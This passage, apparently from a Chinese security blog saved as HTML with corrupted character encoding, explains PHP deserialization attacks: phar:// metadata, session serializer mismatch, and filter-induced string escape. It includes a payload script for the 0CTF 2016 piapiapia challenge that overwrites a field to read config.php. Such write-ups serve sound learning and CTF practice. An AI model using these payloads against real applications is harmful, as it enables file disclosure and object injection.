signatureï¼šå½“æˆ‘ä»¬éœ€è¦æ”¹å˜pharæ–‡ä»¶å†…å®¹æ—¶ï¼Œéœ€è¦é‡æ–°ç”Ÿæˆç­¾å</p><p>â€‹     </p><h2 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h2><ol><li><p>pharä¸­manifestæ˜¯ç”¨æˆ·è‡ªå®šä¹‰çš„</p></li><li><p>phpä¸€å¤§éƒ¨åˆ†çš„<strong>æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åœ¨é€šè¿‡<code>phar://</code>ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–</strong>.</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;destruct&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">#test.pharæ˜¯ä¸Šé¢ç”Ÿæˆä»£ç ç”Ÿæˆçš„</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&quot;phar://test.phar&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>   <img src="/../images/image-20220708185428364.png" alt="image-20220708185428364"></p><p>3.å—åˆ°å½±å“çš„å‡½æ•°</p><p>From <a href="https://blog.zsxsoft.com/post/38?from=timeline&amp;isappinstalled=0">https://blog.zsxsoft.com/post/38?from=timeline&amp;isappinstalled=0</a></p><p><img src="/../images/image-20220714125317293.png" alt="image-20220714125317293"></p><p>â€‹</p></li></ol><p></p><h2 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h2><ol><li><p>ç»•è¿‡pharå¼€å¤´</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">compress.bzip:<span class="comment">//phar:///test.phar/test.txt</span></span><br><span class="line">compress.bzip2:<span class="comment">//phar:///test.phar/test.txt</span></span><br><span class="line">compress.zlib:<span class="comment">//phar:///home/sx/test.phar/test.txt</span></span><br><span class="line"></span><br><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=phar://phar.phar</span></span><br></pre></td></tr></table></figure></li><li><p>ç»•è¿‡pharæ ‡è¯†ç¬¦<code>&lt;?php __HALT_COMPILER(); ?&gt;</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gzip phar.phar #ä½¿ç”¨å‹ç¼©åpharæ–‡ä»¶åŒæ ·ä¹Ÿèƒ½ååºåˆ—åŒ–</span><br></pre></td></tr></table></figure></li><li><p>ç­¾åä¿®æ”¹</p></li></ol><h1 id="sessionååºåˆ—åŒ–"><a href="#sessionååºåˆ—åŒ–" class="headerlink" title="sessionååºåˆ—åŒ–"></a>sessionååºåˆ—åŒ–</h1><p><a href="https://xz.aliyun.com/t/6640#toc-5">https://xz.aliyun.com/t/6640#toc-5</a></p><h2 id="sessionå·¥ä½œæµç¨‹"><a href="#sessionå·¥ä½œæµç¨‹" class="headerlink" title="sessionå·¥ä½œæµç¨‹"></a>sessionå·¥ä½œæµç¨‹</h2><p><img src="/../images/20191026142328-1fba974c-f7b9-1-1685604427875.png" alt="20191026142328-1fba974c-f7b9-1"></p><h2 id="sessionåºåˆ—åŒ–"><a href="#sessionåºåˆ—åŒ–" class="headerlink" title="sessionåºåˆ—åŒ–"></a>sessionåºåˆ—åŒ–</h2><p><code>PHP session</code>çš„å­˜å‚¨æœºåˆ¶æ˜¯ç”±<code>session.serialize_handler</code>æ¥å®šä¹‰å¼•æ“çš„ï¼Œé»˜è®¤æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼å­˜å‚¨ï¼Œä¸”å­˜å‚¨çš„æ–‡ä»¶æ˜¯ç”±<code>sess_sessionid</code>æ¥å†³å®šæ–‡ä»¶åçš„ã€‚</p><blockquote><p>é€šå¸¸æ–‡ä»¶åä¸ºsess_sessionidçš„å½¢å¼ï¼Œé»˜è®¤çš„å¼•æ“æ˜¯php</p></blockquote><p><img src="/../images/image-20220730213222612.png" alt="image-20220730213222612"></p><h2 id="äº§ç”Ÿçš„åŸå› "><a href="#äº§ç”Ÿçš„åŸå› " class="headerlink" title="äº§ç”Ÿçš„åŸå› "></a>äº§ç”Ÿçš„åŸå› </h2><p>sessionåºåˆ—åŒ–å’Œååºåˆ—åŒ–æ‰€ä½¿ç”¨åˆ°çš„å¼•æ“ä¸åŒ</p><p>ä¾‹å¦‚</p><ul><li><p>ç¬¬ä¸€æ¬¡è¯·æ±‚ï¼Œåºåˆ—åŒ–ç”¨çš„å¼•æ“ä¸ºphp</p><p>å‡è®¾è¦ä¿å­˜åˆ°sessionçš„æ•°æ®ä¸ºusername&#x3D;khaz</p><ul><li><p>phpæ€ä¹ˆçŸ¥é“è¦ä¿å­˜å“ªäº›æ•°æ®åˆ°sessionä¸­</p><blockquote><p>é€šè¿‡åœ¨$_SESSIONç¯å¢ƒå˜é‡æ³¨å†Œ</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å°†usernameå˜é‡ä¿å­˜åˆ°sessionä¸­</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>ä¼šè¯ç»“æŸåï¼Œå°†$_SESSIONåºåˆ—åŒ–ä¿å­˜åˆ°sessionæ–‡ä»¶ä¸­ã€‚</p><p>æ­£å¸¸ä¿å­˜</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;Khaz&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬æ„é€ username&#x3D;|a:1:{s:8:â€passwdâ€;s:4:â€Khazâ€;}</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">31</span>:<span class="string">&quot;|a:1:&#123;s:8:&quot;</span>passwd<span class="string">&quot;;s:4:&quot;</span>Khaz<span class="string">&quot;;&#125;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></li><li><p>ç¬¬äºŒæ¬¡è¯·æ±‚ï¼Œååºåˆ—åŒ–ç”¨çš„å¼•æ“ä¸ºphp_serialize</p><p>æ­£å¸¸</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;Khaz&quot;</span>;&#125;</span><br><span class="line">â†’ <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]=Khaz</span><br></pre></td></tr></table></figure><p>æ”»å‡»</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">31</span>:<span class="string">&quot;|a:1:&#123;s:8:&quot;</span>passwd<span class="string">&quot;;s:4:&quot;</span>Khaz<span class="string">&quot;;&#125;&quot;</span>;&#125;</span><br><span class="line">â†’ <span class="variable">$_SESSION</span>[<span class="string">&#x27;passwd&#x27;</span>]=Khaz</span><br></pre></td></tr></table></figure><blockquote><p>ä»è€Œæˆ‘ä»¬å°±å¯ä»¥è‡ªå®šä¹‰$_SESSIONç¯å¢ƒå˜é‡çš„å€¼</p></blockquote></li></ul><h1 id="è¿‡æ»¤ä¸å½“å¯¼è‡´çš„å­—ç¬¦ä¸²é€ƒé€¸ååºåˆ—"><a href="#è¿‡æ»¤ä¸å½“å¯¼è‡´çš„å­—ç¬¦ä¸²é€ƒé€¸ååºåˆ—" class="headerlink" title="è¿‡æ»¤ä¸å½“å¯¼è‡´çš„å­—ç¬¦ä¸²é€ƒé€¸ååºåˆ—"></a>è¿‡æ»¤ä¸å½“å¯¼è‡´çš„å­—ç¬¦ä¸²é€ƒé€¸ååºåˆ—</h1><h2 id="å½¢æˆåŸå› "><a href="#å½¢æˆåŸå› " class="headerlink" title="å½¢æˆåŸå› "></a>å½¢æˆåŸå› </h2><p>phpååºåˆ—åŒ–ç‰¹ç‚¹</p><ul><li>ä»¥}ä½œä¸ºç»“æŸç¬¦ï¼Œåœ¨}ä¹‹åçš„å­—ç¬¦ä¼šè¢«èˆå»</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;a:2:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;fdafadf&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;</span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  <span class="string">&#x27;a&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line">  <span class="string">&#x27;b&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">2</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ååºåˆ—åŒ–æ—¶ä¼šæ ¹æ®å‰é¢ç»™å®šçš„é•¿åº¦ï¼Œè¯»å–å¯¹åº”é•¿åº¦çš„å­—ç¬¦ä¸²</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;a:2:&#123;s:4:&quot;a&quot;;&quot;&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">//s:4:&quot;(a&quot;;&quot;)&quot;; æ‹¬å·åªæ˜¯æ ‡æ³¨å¤„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment">//é•¿åº¦ä¸º4ä»ç¬¬ä¸€ä¸ª&quot;å¼€å§‹è¯»å–4ä¸ªå­—ç¬¦a&quot;;&quot;</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;</span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  <span class="string">&#x27;a&quot;;&quot;&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line">  <span class="string">&#x27;b&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">2</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>å½“åºåˆ—åŒ–çš„é•¿åº¦&#x2F;æ•°é‡ä¸å®é™…ä¸ç¬¦æ—¶ï¼Œååºåˆ—åŒ–ä¼šæŠ¥é”™</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;a:2:&#123;s:4:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;&#x27;</span>;<span class="comment">//s:4:&quot;a&quot;; é•¿åº¦ä¸º4ï¼Œå®é™…å­—ç¬¦ä¸²ä¸ºaï¼Œé•¿åº¦ä¸º1</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;a:3:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;&#x27;</span>;<span class="comment">//a:3è¯´æ˜æœ‰ä¸‰ä¸ªå€¼ï¼Œå®é™…ä¸Ša=&gt;1,b=&gt;2,åªæœ‰ä¸¤ä¸ªå€¼</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">error  </span><br><span class="line">error</span><br></pre></td></tr></table></figure><p>å½“å­˜åœ¨ä»¥ä¸‹æµç¨‹ï¼šåºåˆ—åŒ–â†’è¿‡æ»¤â†’ååºåˆ—åŒ–</p><ul><li><p>è¿‡æ»¤ï¼šåœ¨å¯¹å¯æ§å˜é‡è¿›è¡Œè¿‡æ»¤äº†ä¹‹åï¼Œå°±ä¼šä½¿å¾—å…¶åºåˆ—åŒ–çš„é•¿åº¦ä¸å­—ç¬¦ä¸²é•¿åº¦ä¸åŒ¹é…ï¼Œç„¶åååºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šæŠ¥é”™ï¼Œæ— æ³•æ‰§è¡Œååºåˆ—åŒ–ï¼Œå°±ä¸ä¼šæ‰§è¡Œæ”»å‡»è€…æ„é€ çš„æ”»å‡»ä»£ç ã€‚ä½†æ˜¯åˆ©ç”¨å‰é¢æåˆ°çš„ç¬¬ä¸€å’Œç¬¬äºŒä¸ªç‰¹æ€§ï¼Œæ”»å‡»è€…å¯ä»¥åˆ†æè¿‡æ»¤å‰åå­—ç¬¦ä¸²é•¿åº¦çš„å˜åŒ–ï¼Œæ„é€ å­—ç¬¦ä¸²(å­—ç¬¦ä¸²å½¢å¼ä¸ºè¢«è¿‡æ»¤å­—ç¬¦+ç›®æ ‡å­ä¸²)æ¥è¦†ç›–å…¶ä»–å˜é‡ã€‚</p></li><li><p>ç›®æ ‡å­—ä¸²ï¼š</p><p><code>&quot;;+åºåˆ—åŒ–åçš„å˜é‡+&#125;</code></p><p>ä¾‹å¦‚æˆ‘æƒ³è¦é€ƒé€¸<code>$name=&#39;khaz&#39;</code>ï¼Œé‚£ä¹ˆç›®æ ‡å­—ä¸²ä¸º<code>&quot;;s:4:&quot;name&quot;;s:4:&quot;khaz&quot;;&#125;</code></p></li></ul><h2 id="åˆ†ç±»å’Œæ€è·¯"><a href="#åˆ†ç±»å’Œæ€è·¯" class="headerlink" title="åˆ†ç±»å’Œæ€è·¯"></a>åˆ†ç±»å’Œæ€è·¯</h2><h3 id="è¿‡æ»¤åå­—ç¬¦å˜å¤š"><a href="#è¿‡æ»¤åå­—ç¬¦å˜å¤š" class="headerlink" title="è¿‡æ»¤åå­—ç¬¦å˜å¤š"></a>è¿‡æ»¤åå­—ç¬¦å˜å¤š</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ€è·¯ï¼šè®©è¿‡æ»¤åçš„å­—ç¬¦ä¸²å¡«å……å®Œé•¿åº¦ï¼Œä»è€Œè®©åé¢çš„å˜é‡è§£æ”¾å‡ºæ¥</span><br><span class="line">éœ€è¦è®¡ç®—ç›®æ ‡å­—ä¸²çš„é•¿åº¦l1å’Œè¿‡æ»¤åå¢åŠ çš„é•¿åº¦l2</span><br><span class="line">payload:è¢«è¿‡æ»¤å­—ç¬¦*(l1/l2)+ç›®æ ‡å­ä¸²</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">å‡è®¾å¯¹å˜é‡<span class="variable">$a</span>è¿›è¡Œè¿‡æ»¤</span><br><span class="line">è¿‡æ»¤è§„åˆ™ï¼šaâ†’bb</span><br><span class="line"><span class="variable">$a</span>ä¸­çš„æ¯ä¸ªaåœ¨è¿‡æ»¤åéƒ½ä¼šä½¿å­—ç¬¦ä¸²é•¿åº¦åŠ <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">å‡è®¾ç›®æ ‡å­ä¸²ä¸ºï¼š<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:6:&quot;</span><span class="number">123456</span><span class="string">&quot;;&#125; ä¸€å…±31ä¸ªå­—ç¬¦</span></span><br><span class="line"><span class="string">å°±éœ€è¦é‡å¤a31æ¬¡ï¼Œæ„é€ <span class="subst">$a</span>=&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;&#125;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">è¿™æ ·åºåˆ—åŒ–åæœ‰ï¼š</span></span><br><span class="line"><span class="string">s:62:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;&quot;</span></span><br><span class="line"><span class="string">æ­¤æ—¶é•¿åº¦å¯¹åº”å­—ç¬¦ï¼š62:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">è¿‡æ»¤åï¼š</span></span><br><span class="line"><span class="string">s:62:&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;</span></span><br><span class="line"><span class="string">é•¿åº¦å¯¹åº”å­—ç¬¦ï¼š 62:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span></span><br><span class="line"><span class="string">ä»è€Œä½¿s:8:&quot;password&quot;;s:6:&quot;123456&quot;;è§£æ”¾å‡ºæ¥</span></span><br></pre></td></tr></table></figure><h4 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h4><p><a href="http://www.zipå¾—åˆ°æºç ,å®¡è®¡å¾—åˆ°å¦‚ä¸‹å…³é”®ç‚¹/">www.zipå¾—åˆ°æºç ï¼Œå®¡è®¡å¾—åˆ°å¦‚ä¸‹å…³é”®ç‚¹</a></p><ol><li><p>flagåœ¨config.php</p></li><li><p>è¿‡æ»¤å‡½æ•°</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ç”¨_ä»£æ›¿\å’Œ\\</span></span><br><span class="line"><span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line"><span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç”¨hackerä»£æ›¿array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;)</span></span><br><span class="line"><span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line"><span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br></pre></td></tr></table></figure><p>å­—ç¬¦ä¸²é€ƒé€¸ï¼šå­—ç¬¦ä¸²å˜å¤š whereï¼š5  â†’  hackerï¼š6  </p></li><li><p>ååºåˆ—åŒ–ç‚¹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$profile</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$profile</span>);</span><br><span class="line"><span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$photo</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br></pre></td></tr></table></figure><p>å­—ç¬¦ä¸²é€ƒé€¸è¦†ç›–$photoä¸ºconfig.php</p></li><li><p>åºåˆ—åŒ–ç‚¹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span>-&gt;<span class="title function_ invoke__">update_profile</span>(<span class="variable">$username</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>));</span><br></pre></td></tr></table></figure></li><li><p>æ­£åˆ™</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#11ä½æ•°å­—</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#xxx@xxx.xxx xxxé™åˆ¶[_a-zA-Z0-9]</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#é•¿åº¦&lt;=10</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br></pre></td></tr></table></figure><p>éœ€è¦ç»•è¿‡nicknameçš„æ­£åˆ™ï¼Œç”¨æ•°ç»„ç»•è¿‡å³å¯ã€‚</p></li></ol><p>éœ€è¦é€ƒé€¸çš„å˜é‡ä¸º<code>$photo=&#39;config.php&#39;</code>ï¼Œç›®æ ‡å­ä¸²ä¸º<code>&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>ï¼Œå…±33ä¸ªå­—ç¬¦ï¼Œä¸€ä¸ªwhereåœ¨æ›¿æ¢åé•¿åº¦åŠ 1ï¼Œæ‰€ä»¥éœ€è¦33ä¸ªwhereã€‚</p><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">    <span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="string">&#x27;12345678901&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&#x27;734541725@qq.com&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="string">&#x27;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;sadasd&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;è¿‡æ»¤å:&quot;</span>,<span class="variable">$serialize_info</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ååºåˆ—åŒ–åï¼š&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>));</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span>(<span class="number">320</span>) <span class="string">&quot;a:4:&#123;s:5:&quot;</span>phone<span class="string">&quot;;s:11:&quot;</span><span class="number">12345678901</span><span class="string">&quot;;s:5:&quot;</span>email<span class="string">&quot;;s:16:&quot;</span><span class="number">734541725</span>@qq.com<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;s:198:&quot;</span>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">&quot;;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;sadasd&quot;</span>;&#125;<span class="string">&quot;</span></span><br><span class="line"><span class="string">è¿‡æ»¤å:a:4:&#123;s:5:&quot;</span>phone<span class="string">&quot;;s:11:&quot;</span><span class="number">12345678901</span><span class="string">&quot;;s:5:&quot;</span>email<span class="string">&quot;;s:16:&quot;</span><span class="number">734541725</span>@qq.com<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;s:198:&quot;</span>hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker<span class="string">&quot;;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;sadasd&quot;</span>;&#125;</span><br><span 